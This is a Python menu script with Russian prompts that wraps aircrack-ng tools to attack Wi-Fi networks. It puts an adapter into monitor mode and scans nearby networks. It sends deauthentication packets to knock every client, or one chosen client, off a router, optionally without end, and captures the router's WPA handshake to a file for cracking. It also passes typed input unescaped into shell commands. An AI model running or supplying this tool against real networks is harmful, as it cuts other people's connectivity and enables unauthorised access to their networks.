import os
from colorama import Fore, Back, Style, init
import time

# ~ init(autoreset=True)

# ~ os.system("command")

def start():
	# ~ Переменная выбора режима
	a = input(Fore.GREEN + "1. Отключить все пользователей\n2. Отключить одного\n3. Остановить службы и запустить режим монитора\n4. Запустить режим монитора\n5. Просканировать определенную сеть\n6. Востоновить работу адаптера wifi\n" + Fore.YELLOW)
	
	
	# ~ Отключение всех пользователей от роутера
	if(a == "1"):
		bssid = input(Fore.YELLOW + f"Введите мак адрес роутера (пример: {Fore.BLUE}00:F0:1D:F5:E2:19{Fore.YELLOW}): {Fore.BLUE}")
		count = input(Fore.YELLOW + f"\nВведите количество пакетов деаунтификации: \n\n{Fore.BLUE}0.{Fore.YELLOW} Будет работать пока не отключите программу\n{Fore.BLUE}50.{Fore.YELLOW} Рекомендуемое значение\n{Fore.BLUE}?.{Fore.YELLOW} Или же введите свое значение\n{Fore.BLUE}")
		wlan = input(Fore.YELLOW + f"\nВведите название своего адаптера (по умолчанию {Fore.BLUE}wlan0mon{Fore.YELLOW}): {Fore.BLUE}")
		# ~ os.system(f"aireplay-ng -0 {count} -a {bssid} {wlan}")
		os.system(f'gnome-terminal --window -- bash -c "sleep 1s; aireplay-ng -0 {count} -a {bssid} {wlan}; exec bash -i"')
		start()
	
	# ~ Отключение одного пользователся от роутера
	elif(a == "2"):
		bssid = input(Fore.YELLOW + f"Введите мак адрес роутера (пример: {Fore.BLUE}00:F0:1D:F5:E2:19{Fore.YELLOW}): {Fore.BLUE}")
		cbssid = input(Fore.YELLOW + f"Введите макс адрес пользователя которого отключаете (пример: {Fore.BLUE}00:F0:1D:F5:E2:19{Fore.YELLOW}): {Fore.BLUE}")
		count = input(Fore.YELLOW + f"\nВведите количество пакетов деаунтификации: \n\n{Fore.BLUE}0.{Fore.YELLOW} Будет работать пока не отключите программу\n{Fore.BLUE}50.{Fore.YELLOW} Рекомендуемое значение\n{Fore.BLUE}?.{Fore.YELLOW} Или же введите свое значение\n{Fore.BLUE}")
		wlan = input(Fore.YELLOW + f"\nВведите название своего адаптера (по умолчанию {Fore.BLUE}wlan0mon{Fore.YELLOW}): {Fore.BLUE}")
		# ~ os.system(f"aireplay-ng --deauth {count} -a {bssid} -c {cbssid} {wlan}")
		os.system(f'gnome-terminal --window -- bash -c "sleep 1s; aireplay-ng --deauth {count} -a {bssid} -c {cbssid} {wlan}; exec bash -i"')
		start()
	# ~ Остановление служб и включение режима монитора
	elif(a == "3"):
		# ~ os.system(f'gnome-terminal --window -- bash -c "sleep 1s; airmon-ng check kill; airmon-ng start wlan0; airmon-ng; exec bash -i"')
		print(Fore.BLUE)
		os.system('airmon-ng check kill; airmon-ng start wlan0; airmon-ng')
		print(Fore.RED + "Остоновлены системы airmon и был запущен режим монитора!!\n")
		start()
	
	# ~ Санирование всех сетей wifi
	elif(a == "4"):
		wlan = input(Fore.YELLOW + f"\nВведите название своего адаптера (по умолчанию {Fore.BLUE}wlan0mon{Fore.YELLOW}): {Fore.BLUE}")
		os.system(f'gnome-terminal --window -- bash -c "sleep 1s; airodump-ng {wlan}; exec bash -i"')
		start()
		
	# ~ Сканирование одного роутера	
	elif(a == "5"):
		wlan = input(Fore.YELLOW + f"\nВведите название своего адаптера (по умолчанию {Fore.BLUE}wlan0mon{Fore.YELLOW}): {Fore.BLUE}")
		channel = input(Fore.YELLOW + f"Введите канал сети ({Fore.BLUE}1-13{Fore.YELLOW}): {Fore.BLUE}")
		bssid = input(Fore.YELLOW + f"Введите мак адрес роутера (пример: {Fore.BLUE}00:F0:1D:F5:E2:19{Fore.YELLOW}): {Fore.BLUE}")
		hand = input(Fore.YELLOW + f"Введите место сохранение хеншейка ({Fore.BLUE}/home/kali/wifi/{Fore.YELLOW}): {Fore.BLUE}")
		os.system(f'gnome-terminal --window -- bash -c "sleep 1s; airodump-ng --bssid {bssid} --channel {channel} -w {hand} {wlan}; exec bash -i"')
		start()
		
	# ~ Превести адаптер в обычное состояние
	elif(a == "6"):
		wlan = input(Fore.YELLOW + f"\nВведите название своего адаптера (по умолчанию {Fore.BLUE}wlan0mon{Fore.YELLOW}): {Fore.BLUE}")
		os.system(f'airmon-ng stop {wlan}')
		os.system('service NetworkManager start')
		print(Fore.RED + "Режим работы адаптера востоновлен\n")
		start()
		
	# ~ Не правельный выбор
	else:
		print(Fore.RED + "Не правельный выбор, попробуйте еще раз!\n")		
		start()
		
print(Style.BRIGHT)
print(Fore.RED + "--------------------------------------\n\nЗагрузка скрита для перехвата хеншейка\nBy NN github.com/EmptyLs\n\n--------------------------------------\n")
time.sleep(1)
start()
